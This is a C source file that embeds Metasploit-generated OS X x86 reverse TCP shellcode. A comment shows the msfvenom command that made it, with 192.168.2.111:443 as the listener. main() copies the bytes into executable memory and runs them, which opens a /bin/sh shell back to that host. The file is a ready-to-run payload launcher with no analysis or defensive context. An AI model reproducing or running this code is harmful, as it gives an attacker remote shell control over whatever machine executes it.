//same as for 64bit...
//msfvenom -p osx/x86/shell_reverse_tcp EXITFUNC=process LHOST=192.168.2.111 LPORT=443 --platform OSX -f c
#include <string.h>
#include <sys/mman.h>

unsigned char buf[] = 
"\x68\xc0\xa8\x02\x6f\x68\xff\x02\x01\xbb\x89\xe7\x31\xc0\x50"
"\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
"\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53"
"\x50\xb0\x3b\xcd\x80";


int main(int argc, char **argv)
{
	void *ptr = mmap(0, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
	memcpy(ptr,buf,sizeof buf);
	void (*fp)() = (void (*)())ptr;
	fp();

}
